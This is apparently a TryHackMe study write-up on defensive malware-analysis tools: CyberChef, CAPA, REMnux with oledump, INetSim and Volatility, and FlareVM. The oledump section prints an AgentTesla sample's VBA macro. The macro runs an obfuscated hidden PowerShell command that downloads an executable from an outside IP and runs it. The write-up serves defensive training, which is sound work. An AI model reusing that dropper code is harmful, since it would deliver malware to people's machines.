---
title: "defensivetools"
quote: tryhackme
categories:
  - 技术
  - 教程
tags: [Markdown, web]
description: Defensive Security Tools
draft: false
sidebar: false
outline: deep
---

#  Defensive Security Tools

## CyberChef

CyberChef is a simple, intuitive web-based application designed to help with various “cyber” operation tasks within your web browser. Think of it as a **Swiss Army knife** for data - like having a toolbox of different tools designed to do a specific task. These tasks range from simple encodings like **XOR** or **Base64** to complex operations like **AES encryption** or **RSA decryption**. CyberChef operates on **recipes**, a series of operations executed in order.

[Online Access](https://gchq.github.io/CyberChef/) 

[Offline or Local Copy](https://github.com/gchq/CyberChef/releases)



<span style="font-size: 23px;">**ok...  just use it!!!**</span>

---

## CAPA

CAPA (Common Analysis Platform for Artifacts) is a tool developed by the FireEye Mandiant team. It is designed to **identify the capabilities** present in executable files like Portable Executables (PE), ELF binaries, .NET modules, shellcode, and even sandbox reports. It does so by analyzing the file and applying a set of rules that **describe common behaviours**, allowing it to determine what the **program is capable of doing**, such as **network communication**, **file manipulation**, **process injection**, and many more.

```bash
PS C:\Users\Administrator\Desktop\capa> capa .\cryptbot.bin

PS C:\Users\Administrator\Desktop\capa > get-content cryptbot.txt 

```

---

## REMnux

The REMnux VM is a specialised Linux distro. It already includes tools like Volatility, YARA, Wireshark, oledump, and INetSim. It also provides a sandbox-like environment for dissecting potentially malicious software without risking your primary system. It's your lab set up and ready to go without the hassle of manual installations.

<span style="font-size: 23px;">**oledump.py**</span>

`Oledump.py` is a Python tool that analyzes `OLE2` files, commonly called Structured Storage or Compound File Binary Format. `OLE` stands for `Object Linking and Embedding`, a proprietary technology developed by Microsoft. OLE2 files are typically used to store multiple data types, such as documents, spreadsheets, and presentations, within a single file. This tool is handy for extracting and examining the contents of OLE2 files, making it a valuable resource for forensic analysis and malware detection.

```bash
ubuntu@10.10.173.34:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```
We should be aware of the data stream with the capital letter M. This means there is a Macro, and you might want to check out this data stream, 'VBA/ThisWorkbook'.

```bash
ubuntu@10.10.173.34:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
...
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' }  Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
```

<span style="font-size: 23px;">**INetSim**</span>

We can utilize INetSim's features to simulate a real network in this task.

`/etc/inetsim/inetsim.conf`

```bash
ubuntu@MACHINE_IP:~$ sudo nano /etc/inetsim/inetsim.conf
#########################################
# dns_default_ip
#
# Default IP address to return with DNS replies
#
# Syntax: dns_default_ip 
#
# Default: 127.0.0.1
#
#dns_default_ip  0.0.0.0
```
change the value of `dns_default_ip` from `0.0.0.0` to the `machine’s IP` address 

**Connection Report**

`sudo cat /var/log/inetsim/report/report.2594.txt`

<span style="font-size: 23px;">**Volatility**</span>

Volatility commands are executed to identify and extract specific artefacts from memory images, and the resulting output can be saved to text files for further examination.

**Preprocessing With Volatility**

```bash
# PsTree plugin lists processes in a tree based on their parent process ID.
vol3 -f wcry.mem windows.pstree.PsTree

# PsList plugin is used to list all currently active processes in the machine.
vol3 -f wcry.mem windows.pslist.PsList

# CmdLine plugin is used to list process command line arguments.
vol3 -f wcry.mem windows.cmdline.CmdLine

# FileScan plugin scans for file objects in a particular Windows memory image. The results have more than 1,400 lines.
vol3 -f wcry.mem windows.filescan.FileScan

# DllList plugin lists the loaded modules in a particular Windows memory image. Due to a text limitation, this one won't have a View Results icon.
vol3 -f wcry.mem windows.dlllist.DllList

# PsScan plugin is used to scan for processes present in a particular Windows memory image.
vol3 -f wcry.mem windows.psscan.PsScan

# Malfind plugin is used to lists process memory ranges that potentially contain injected code. There won't be any View Results icon for this one due to text limitation.
vol3 -f wcry.mem windows.malfind.Malfind

# preprocessing evidence and saving the results to text files across a loop statement
for plugin in windows.malfind.Malfind windows.psscan.PsScan windows.pstree.PsTree windows.pslist.PsList windows.cmdline.CmdLine windows.filescan.FileScan windows.dlllist.DllList; do vol3 -q -f wcry.mem $plugin > wcry.$plugin.txt; done
```
more information regarding [other plugins](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html)

**Preprocessing With Strings**

Next, we will preprocess the memory image with the Linux strings utility. We will extract the **ASCII**, 16-bit   , and 16-bit **big-endian** strings. See the command below.

```bash
strings wcry.mem > wcry.strings.ascii.txt
strings -e l  wcry.mem > wcry.strings.unicode_little_endian.txt
strings -e b  wcry.mem > wcry.strings.unicode_big_endian.txt
```
---

## FlareVM

**FlareVM**, or "**Forensics, Logic Analysis, and Reverse Engineering**," stands out as a comprehensive and carefully curated collection of specialized tools uniquely designed to meet the specific needs of reverse engineers, malware analysts, incident responders, forensic investigators, and penetration testers. This toolkit, expertly crafted by the FLARE Team at FireEye, is a powerful aid in unravelling digital mysteries, gaining insight into malware behaviour, and delving into the complex details within executables. 